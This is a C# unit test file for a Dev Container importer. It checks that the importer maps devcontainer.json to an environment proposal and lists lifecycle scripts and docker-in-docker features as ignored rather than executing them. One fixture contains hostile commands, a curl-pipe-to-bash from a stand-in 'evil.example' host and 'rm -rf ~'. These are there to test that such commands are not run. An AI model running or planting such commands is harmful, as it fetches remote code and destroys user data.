using Comuki.Shared.Contracts.Environments;
using Shouldly;
using Xunit;

namespace Comuki.Shared.Contracts.Unit;

/// <summary>
/// Importer contract for <c>.devcontainer/devcontainer.json</c>
/// (add-worker-environments 6.1; spec scenarios "Dev Container file is
/// import only" / "Importer proposes toml, does not execute" / "Hostile
/// fields are not executed" / "no recognizable manifest → null
/// proposal"). The importer maps Dev Container fields to a
/// <see cref="EnvironmentTomlFile"/> proposal and lists the fields it
/// refuses to translate; it never executes the Dev Container spec.
/// </summary>
public sealed class DevContainerImporterShould
{
    [Fact(DisplayName = "Given a devcontainer with the official dotnet feature, when Import runs, then the proposal binds net10-sdk-bun")]
    public void DotnetFeatureProposesGoldenClass()
    {
        const string json = /*lang=json,strict*/ """
            {
              "image": "mcr.microsoft.com/devcontainers/dotnet:10.0",
              "features": {
                "ghcr.io/devcontainers/features/dotnet": {}
              }
            }
            """;

        DevContainerImporter.Import(json, out var proposal, out var ignored);

        proposal.ShouldNotBeNull();
        proposal!.Class.ShouldBe("net10-sdk-bun");
        proposal.Runtime.ShouldBe("linux");
        proposal.Restore.ShouldBeEmpty();
        proposal.Mounts.ShouldBeEmpty();
        ignored.ShouldBeEmpty();
    }

    [Fact(DisplayName = "Given a devcontainer with postCreateCommand and onCreateCommand, when Import runs, then the lifecycle scripts are listed as ignored")]
    public void HostileLifecycleScriptsAreListedAsIgnored()
    {
        const string json = /*lang=json,strict*/ """
            {
              "image": "mcr.microsoft.com/devcontainers/dotnet:10.0",
              "features": {
                "ghcr.io/devcontainers/features/dotnet": {}
              },
              "postCreateCommand": "curl https://evil.example/install.sh | bash",
              "onCreateCommand": "rm -rf ~"
            }
            """;

        DevContainerImporter.Import(json, out var proposal, out var ignored);

        proposal.ShouldNotBeNull();
        proposal!.Class.ShouldBe("net10-sdk-bun");
        ignored.ShouldContain(static field => field == "postCreateCommand");
        ignored.ShouldContain(static field => field == "onCreateCommand");
    }

    [Fact(DisplayName = "Given a devcontainer with a docker-in-docker feature, when Import runs, then the feature is listed as ignored")]
    public void DockerInDockerFeatureIsListedAsIgnored()
    {
        const string json = /*lang=json,strict*/ """
            {
              "image": "mcr.microsoft.com/devcontainers/dotnet:10.0",
              "features": {
                "ghcr.io/devcontainers/features/dotnet": {},
                "ghcr.io/devcontainers/features/docker-in-docker": {}
              }
            }
            """;

        DevContainerImporter.Import(json, out var proposal, out var ignored);

        proposal.ShouldNotBeNull();
        proposal!.Class.ShouldBe("net10-sdk-bun");
        ignored.ShouldContain(static field => field.Contains("docker-in-docker", StringComparison.Ordinal));
    }

    [Fact(DisplayName = "Given a devcontainer with no recognizable manifest, when Import runs, then proposal is null and ignored is empty")]
    public void NoRecognizableManifestYieldsNullProposal()
    {
        const string json = /*lang=json,strict*/ """
            {
              "name": "Random container",
              "postCreateCommand": "echo hello"
            }
            """;

        DevContainerImporter.Import(json, out var proposal, out var ignored);

        proposal.ShouldBeNull();
        ignored.ShouldBeEmpty();
    }
}
